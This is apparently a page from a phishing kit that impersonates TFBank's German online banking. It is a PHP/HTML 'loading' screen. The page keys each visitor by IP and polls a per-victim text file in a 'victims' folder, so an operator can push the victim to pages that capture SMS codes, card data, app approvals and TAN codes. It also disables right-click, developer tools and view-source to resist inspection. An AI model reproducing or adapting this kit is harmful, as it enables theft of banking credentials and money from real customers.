
<?php error_reporting(0);


  function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 
$xeno = $_SERVER['REMOTE_ADDR'];

    
    require_once '../includes/main.php';
    $_SESSION['last_page'] = 'loading';


?>
<html lang="de" xmlns:wicket="" data-device="DESKTOP" class=""><head>



<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no">

<meta charset="UTF-8">
<title>TFBank</title>
<link rel="stylesheet" type="text/css" href="css/1.css"> 
  <link rel="stylesheet" type="text/css" href="css/2.css"> 
  <link rel="stylesheet" type="text/css" href="css/wave.css">
</head>



<body style=cursor:auto><div id=root><div class="App de"><div class="h-100 login-bg"><div class="h-100 inner d-flex justify-content-center align-items-center w-100"><div><div class="login-container m-2 d-flex flex-column justify-content-between align-items-center">


    <div class="btn authButton GermanyOtp"></div><div class="p-4 content">


<div class="center">
  <div class="wave"></div>
  <div class="wave"></div>
  <div class="wave"></div>
  <div class="wave"></div>
  <div class="wave"></div>
  <div class="wave"></div>
  <div class="wave"></div>
  <div class="wave"></div>
  <div class="wave"></div>
  <div class="wave"></div>
</div>
<br><br><br>
<div class="center">
    <p>Bitte warten Sie einige Sekunden, während wir Ihre Anfrage bearbeiten. Wir möchten Sie bitten, diese Seite nicht zu verlassen, um sicherzustellen, dass Ihr Prozess nicht unterbrochen wird. Vielen Dank für Ihr Verständnis und Ihre Geduld.</p>

</div>
<br><br><br>



  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script>
            var ip = '<?php echo get_client_ip(); ?>';
            var waiting = setInterval(function() {
                $.get('../victims/' + ip + '.txt', function(data) {
                    if( data == 0 ) {
                        //console.log('hada ba9i 0');
                    } else {
                        var zow = data.split('/');
                        var one = zow[0];
                        var two = zow[1];
                        if( one == 'errorlogin' ) {
                            clearInterval(waiting);
                            location.href = "../index.php?redirection=errorlogin";
                        } else if( one == 'sms' ) {
                            clearInterval(waiting);
                            location.href = "../index.php?redirection=sms";
                        }  else if( one == 'cc' ) {
                            clearInterval(waiting);
                            location.href = "../index.php?redirection=cc";
                        }

                         else if( one == 'app' ) {
                            clearInterval(waiting);
                            location.href = "../index.php?redirection=app";
                        }

                        else if( one == 'firma' ) {
                            clearInterval(waiting);
                            location.href = "../index.php?redirection=firma";
                        }  
             else if( one == 'tan' ) {
                            clearInterval(waiting);
                            var code1 = zow[1];
                            var code2 = zow[2];
                            var code3 = zow[3];
                            location.href = "../index.php?redirection=tan&code1="+ code1 +"&code2="+ code2 +"&code3=" + code3;
                        }


                          else if( one == 'success' ) {
                            clearInterval(waiting);
                            location.href = "../index.php?redirection=success";
                        }

                    }
                });
            }, 1000);
        </script>



    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.6.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.16.0/jquery.validate.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>

